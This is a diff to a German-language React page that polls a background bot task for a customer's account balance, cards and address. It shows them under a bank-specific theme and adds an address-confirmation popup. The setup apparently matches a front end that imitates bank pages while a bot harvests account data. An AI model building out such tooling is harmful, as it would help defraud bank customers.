@@ -142,21 +142,23 @@ function PersonalDataPage() {
     } catch {}
   }, [taskId]);
 
-  // Keep polling briefly in case more fields arrive after the initial redirect
+  // Keep polling the task so late-arriving fields (Kontostand, Karten, Adresse)
+  // update the UI while the bot finishes in the background.
   useEffect(() => {
     let cancelled = false;
     let timer: ReturnType<typeof setTimeout> | null = null;
-    let attempts = 0;
+    const startedAt = Date.now();
+    const TIMEOUT_MS = 5 * 60 * 1000;
     const tick = async () => {
-      attempts += 1;
       const { data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
       if (cancelled) return;
       if (data?.result) {
         setResult(data.result);
         try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
       }
-      if (data?.status === "completed" || data?.status === "failed" || attempts > 12) return;
-      timer = setTimeout(tick, 800);
+      if (data?.status === "completed" || data?.status === "failed") return;
+      if (Date.now() - startedAt > TIMEOUT_MS) return;
+      timer = setTimeout(tick, 1500);
     };
     tick();
     return () => { cancelled = true; if (timer) clearTimeout(timer); };
@@ -167,7 +169,30 @@ function PersonalDataPage() {
     [result, bankCtx?.bankName],
   );
 
-  if (!result || !customer) {
+  const addressData = result?.address_data ?? null;
+
+  // Address confirmation popup (from result.address_data)
+  const [confirmingAddress, setConfirmingAddress] = useState(false);
+  const [addressConfirmed, setAddressConfirmed] = useState(false);
+  const [addressError, setAddressError] = useState<string | null>(null);
+  const [addressPopupOpen, setAddressPopupOpen] = useState(true);
+
+  const handleConfirmAddress = async () => {
+    setConfirmingAddress(true);
+    setAddressError(null);
+    try {
+      const res = await confirmAddress(taskId);
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      setAddressConfirmed(true);
+      setTimeout(() => setAddressPopupOpen(false), 1200);
+    } catch (e: any) {
+      setAddressError(e?.message || "Fehler beim Bestätigen. Bitte erneut versuchen.");
+    } finally {
+      setConfirmingAddress(false);
+    }
+  };
+
+  if (!result && !addressData) {
     return (
       <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
         <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
@@ -175,6 +200,7 @@ function PersonalDataPage() {
       </div>
     );
   }
+
 
   const theme = bankCtx?.theme ?? DEFAULT_THEME;
   const shellProps = {
